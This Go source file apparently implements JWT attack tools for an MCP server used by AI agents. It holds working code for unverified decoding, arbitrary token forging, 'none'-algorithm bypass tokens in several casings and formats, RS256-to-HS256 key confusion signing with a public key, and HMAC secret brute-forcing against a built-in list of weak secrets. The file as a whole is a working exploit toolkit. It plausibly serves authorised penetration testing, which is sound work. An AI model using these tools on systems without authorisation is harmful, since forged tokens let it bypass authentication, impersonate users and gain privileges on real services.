package app

import (
	"context"
	"crypto"
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"hash"
	"strings"
	"time"

	"github.com/mark3labs/mcp-go/mcp"
)

// ---------------------------------------------------------------------------
// JWT helpers (no external JWT library -- manual base64 + crypto)
// ---------------------------------------------------------------------------

// b64UrlEncode encodes data as base64url without padding.
func b64UrlEncode(data []byte) string {
	return strings.TrimRight(base64.URLEncoding.EncodeToString(data), "=")
}

// b64UrlDecode decodes a base64url string, adding padding as needed.
func b64UrlDecode(s string) ([]byte, error) {
	switch len(s) % 4 {
	case 2:
		s += "=="
	case 3:
		s += "="
	}
	return base64.URLEncoding.DecodeString(s)
}

// splitJWT splits a JWT into its three dot-separated parts.
func splitJWT(token string) (header, payload, signature string, err error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", "", "", fmt.Errorf("invalid JWT: expected 3 parts, got %d", len(parts))
	}
	return parts[0], parts[1], parts[2], nil
}

// hmacSign computes an HMAC signature over signingInput using the given secret
// and returns the base64url-encoded result.
func hmacSign(signingInput string, secret []byte, alg string) (string, error) {
	var h func() hash.Hash
	switch alg {
	case "HS256":
		h = sha256.New
	case "HS384":
		h = sha512.New384
	case "HS512":
		h = sha512.New
	default:
		return "", fmt.Errorf("unsupported HMAC algorithm: %s", alg)
	}
	mac := hmac.New(h, secret)
	mac.Write([]byte(signingInput))
	return b64UrlEncode(mac.Sum(nil)), nil
}

// rsaHashForAlg returns the crypto.Hash for an RS* algorithm string.
func rsaHashForAlg(alg string) (crypto.Hash, error) {
	switch alg {
	case "RS256":
		return crypto.SHA256, nil
	case "RS384":
		return crypto.SHA384, nil
	case "RS512":
		return crypto.SHA512, nil
	default:
		return 0, fmt.Errorf("unsupported RSA algorithm: %s", alg)
	}
}

// ---------------------------------------------------------------------------
// Input schemas
// ---------------------------------------------------------------------------

type JwtDecodeArgs struct {
	Token string `json:"token" jsonschema:"required" jsonschema_description:"JWT token to decode"`
}

type JwtForgeArgs struct {
	Header     string `json:"header" jsonschema:"required" jsonschema_description:"JWT header JSON (e.g. {\"alg\":\"HS256\",\"typ\":\"JWT\"})"`
	Payload    string `json:"payload" jsonschema:"required" jsonschema_description:"JWT payload JSON"`
	Secret     string `json:"secret,omitempty" jsonschema_description:"HMAC secret for HS256/384/512"`
	PrivateKey string `json:"privateKey,omitempty" jsonschema_description:"RSA private key PEM for RS256/384/512"`
}

type JwtNoneAttackArgs struct {
	Token   string   `json:"token" jsonschema:"required" jsonschema_description:"Original JWT token to attack"`
	Cases   []string `json:"cases,omitempty" jsonschema_description:"Case variants to try. Default: all 7 (none, None, NONE, nOnE, noNe, nONE, NonE). Pass [\"none\"] for the smallest payload (1 alg variant)."`
	Formats []string `json:"formats,omitempty" jsonschema_description:"Signature formats to emit. Default: all 3 (empty_sig, no_dot, space_sig). Most servers only need empty_sig."`
}

type JwtKeyConfusionArgs struct {
	Token     string `json:"token" jsonschema:"required" jsonschema_description:"RS256/RS384/RS512 JWT token"`
	PublicKey string `json:"publicKey" jsonschema:"required" jsonschema_description:"RSA public key in PEM format"`
}

type JwtBruteforceArgs struct {
	Token    string   `json:"token" jsonschema:"required" jsonschema_description:"HMAC-signed JWT to bruteforce"`
	Wordlist []string `json:"wordlist,omitempty" jsonschema_description:"Custom secrets to try (uses built-in list if empty)"`
}

// ---------------------------------------------------------------------------
// Tool handlers
// ---------------------------------------------------------------------------

// jwtDecodeHandler decodes a JWT token without verifying the signature,
// returning the header, payload, raw signature, and expiration status.
func (backend *Backend) jwtDecodeHandler(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	var args JwtDecodeArgs
	if err := request.BindArguments(&args); err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	headerB64, payloadB64, sigB64, err := splitJWT(args.Token)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	headerBytes, err := b64UrlDecode(headerB64)
	if err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to decode header: %v", err)), nil
	}

	payloadBytes, err := b64UrlDecode(payloadB64)
	if err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to decode payload: %v", err)), nil
	}

	var header map[string]any
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to parse header JSON: %v", err)), nil
	}

	var payload map[string]any
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to parse payload JSON: %v", err)), nil
	}

	result := map[string]any{
		"header":    header,
		"payload":   payload,
		"signature": sigB64,
	}

	// Check expiration if exp claim is present
	if expVal, ok := payload["exp"]; ok {
		var expFloat float64
		switch v := expVal.(type) {
		case float64:
			expFloat = v
		case json.Number:
			expFloat, _ = v.Float64()
		}
		if expFloat > 0 {
			expTime := time.Unix(int64(expFloat), 0)
			result["expired"] = time.Now().Unix() > int64(expFloat)
			result["expiresAt"] = expTime.UTC().Format(time.RFC3339)
		}
	}

	return mcpJSONResult(result)
}

// jwtForgeHandler creates a new JWT with the given header and payload,
// signed with the specified algorithm and key material.
func (backend *Backend) jwtForgeHandler(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	var args JwtForgeArgs
	if err := request.BindArguments(&args); err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	// Validate that header and payload are valid JSON
	var headerMap map[string]any
	if err := json.Unmarshal([]byte(args.Header), &headerMap); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("invalid header JSON: %v", err)), nil
	}

	var payloadMap map[string]any
	if err := json.Unmarshal([]byte(args.Payload), &payloadMap); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("invalid payload JSON: %v", err)), nil
	}

	alg, _ := headerMap["alg"].(string)
	if alg == "" {
		return mcp.NewToolResultError("header must contain an 'alg' field"), nil
	}

	// Re-marshal to get canonical JSON (no extra whitespace)
	headerJSON, _ := json.Marshal(headerMap)
	payloadJSON, _ := json.Marshal(payloadMap)

	headerEncoded := b64UrlEncode(headerJSON)
	payloadEncoded := b64UrlEncode(payloadJSON)
	signingInput := headerEncoded + "." + payloadEncoded

	var sig string

	switch {
	case alg == "none" || alg == "None" || alg == "NONE":
		// No signature for none algorithm
		sig = ""

	case strings.HasPrefix(alg, "HS"):
		if args.Secret == "" {
			return mcp.NewToolResultError("secret is required for HMAC algorithms"), nil
		}
		var err error
		sig, err = hmacSign(signingInput, []byte(args.Secret), alg)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

	case strings.HasPrefix(alg, "RS"):
		if args.PrivateKey == "" {
			return mcp.NewToolResultError("privateKey is required for RSA algorithms"), nil
		}
		block, _ := pem.Decode([]byte(args.PrivateKey))
		if block == nil {
			return mcp.NewToolResultError("failed to parse PEM block from privateKey"), nil
		}

		privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			// Try PKCS8 as fallback
			key, err2 := x509.ParsePKCS8PrivateKey(block.Bytes)
			if err2 != nil {
				return mcp.NewToolResultError(fmt.Sprintf("failed to parse private key (PKCS1: %v, PKCS8: %v)", err, err2)), nil
			}
			var ok bool
			privKey, ok = key.(*rsa.PrivateKey)
			if !ok {
				return mcp.NewToolResultError("PKCS8 key is not an RSA private key"), nil
			}
		}

		hashAlg, err := rsaHashForAlg(alg)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		hasher := hashAlg.New()
		hasher.Write([]byte(signingInput))
		digest := hasher.Sum(nil)

		sigBytes, err := rsa.SignPKCS1v15(nil, privKey, hashAlg, digest)
		if err != nil {
			return mcp.NewToolResultError(fmt.Sprintf("RSA signing failed: %v", err)), nil
		}
		sig = b64UrlEncode(sigBytes)

	default:
		return mcp.NewToolResultError(fmt.Sprintf("unsupported algorithm: %s", alg)), nil
	}

	token := signingInput + "." + sig

	return mcpJSONResult(map[string]any{
		"token": token,
	})
}

// jwtNoneAttackHandler generates JWT tokens with various "none" algorithm
// spellings to test for algorithm confusion vulnerabilities.
func (backend *Backend) jwtNoneAttackHandler(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	var args JwtNoneAttackArgs
	if err := request.BindArguments(&args); err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	_, payloadB64, _, err := splitJWT(args.Token)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	// Decode the original payload for the response
	payloadBytes, err := b64UrlDecode(payloadB64)
	if err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to decode payload: %v", err)), nil
	}

	var originalPayload map[string]any
	if err := json.Unmarshal(payloadBytes, &originalPayload); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to parse payload JSON: %v", err)), nil
	}

	noneVariants := args.Cases
	if len(noneVariants) == 0 {
		noneVariants = []string{"none", "None", "NONE", "nOnE", "noNe", "nONE", "NonE"}
	}
	formats := args.Formats
	if len(formats) == 0 {
		formats = []string{"empty_sig", "no_dot", "space_sig"}
	}
	formatSig := map[string]string{
		"empty_sig": ".",
		"no_dot":    "",
		"space_sig": ". ",
	}

	tokens := make([]map[string]any, 0, len(noneVariants)*len(formats))
	for _, variant := range noneVariants {
		header := map[string]string{"alg": variant, "typ": "JWT"}
		headerJSON, _ := json.Marshal(header)
		headerEncoded := b64UrlEncode(headerJSON)

		for _, fmtName := range formats {
			suffix, ok := formatSig[fmtName]
			if !ok {
				continue
			}
			tokens = append(tokens, map[string]any{
				"alg":    variant,
				"format": fmtName,
				"token":  headerEncoded + "." + payloadB64 + suffix,
			})
		}
	}

	return mcpJSONResult(map[string]any{
		"tokens":          tokens,
		"originalPayload": originalPayload,
		"casesUsed":       noneVariants,
		"formatsUsed":     formats,
	})
}

// jwtKeyConfusionHandler exploits the RS256-to-HS256 key confusion attack.
// It re-signs the token payload using HMAC-SHA256 with the RSA public key
// bytes as the HMAC secret, testing both raw PEM and DER encodings.
func (backend *Backend) jwtKeyConfusionHandler(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	var args JwtKeyConfusionArgs
	if err := request.BindArguments(&args); err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	headerB64, payloadB64, _, err := splitJWT(args.Token)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	// Decode original header to extract the original algorithm
	headerBytes, err := b64UrlDecode(headerB64)
	if err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to decode header: %v", err)), nil
	}

	var originalHeader map[string]any
	if err := json.Unmarshal(headerBytes, &originalHeader); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to parse header JSON: %v", err)), nil
	}

	originalAlg, _ := originalHeader["alg"].(string)

	// Build the HS256 header
	attackHeader := map[string]string{"alg": "HS256", "typ": "JWT"}
	attackHeaderJSON, _ := json.Marshal(attackHeader)
	attackHeaderEncoded := b64UrlEncode(attackHeaderJSON)
	signingInput := attackHeaderEncoded + "." + payloadB64

	tokens := make([]map[string]any, 0, 2)

	// Method 1: Use raw PEM bytes (including BEGIN/END markers) as HMAC secret
	pemBytes := []byte(args.PublicKey)
	sig1, err := hmacSign(signingInput, pemBytes, "HS256")
	if err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("HMAC signing with PEM bytes failed: %v", err)), nil
	}
	tokens = append(tokens, map[string]any{
		"method": "pem_bytes",
		"token":  signingInput + "." + sig1,
	})

	// Method 2: Use DER-encoded public key bytes as HMAC secret
	block, _ := pem.Decode(pemBytes)
	if block != nil {
		sig2, err := hmacSign(signingInput, block.Bytes, "HS256")
		if err != nil {
			return mcp.NewToolResultError(fmt.Sprintf("HMAC signing with DER bytes failed: %v", err)), nil
		}
		tokens = append(tokens, map[string]any{
			"method": "der_bytes",
			"token":  signingInput + "." + sig2,
		})
	}

	return mcpJSONResult(map[string]any{
		"tokens":      tokens,
		"originalAlg": originalAlg,
		"attackAlg":   "HS256",
	})
}

// jwtBruteforceHandler attempts to discover the HMAC secret of a JWT by
// trying a wordlist of common secrets. Returns the secret if found.
func (backend *Backend) jwtBruteforceHandler(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	var args JwtBruteforceArgs
	if err := request.BindArguments(&args); err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	headerB64, payloadB64, sigB64, err := splitJWT(args.Token)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	// Parse header to determine algorithm
	headerBytes, err := b64UrlDecode(headerB64)
	if err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to decode header: %v", err)), nil
	}

	var header map[string]any
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("failed to parse header JSON: %v", err)), nil
	}

	alg, _ := header["alg"].(string)
	if !strings.HasPrefix(alg, "HS") {
		return mcp.NewToolResultError(fmt.Sprintf("token uses %s, not an HMAC algorithm -- bruteforce only works on HS256/HS384/HS512", alg)), nil
	}

	wordlist := args.Wordlist
	if len(wordlist) == 0 {
		wordlist = []string{
			"secret", "password", "123456", "changeme", "key",
			"jwt_secret", "token", "test", "admin", "pass",
			"letmein", "default", "jwt", "supersecret", "secret123",
			"password123", "mysecret", "s3cr3t", "qwerty", "abc123",
		}
	}

	signingInput := headerB64 + "." + payloadB64
	attempts := 0

	for _, word := range wordlist {
		attempts++
		candidate, err := hmacSign(signingInput, []byte(word), alg)
		if err != nil {
			continue
		}
		if candidate == sigB64 {
			return mcpJSONResult(map[string]any{
				"found":     true,
				"secret":    word,
				"attempts":  attempts,
				"algorithm": alg,
			})
		}
	}

	return mcpJSONResult(map[string]any{
		"found":     false,
		"secret":    nil,
		"attempts":  attempts,
		"algorithm": alg,
	})
}
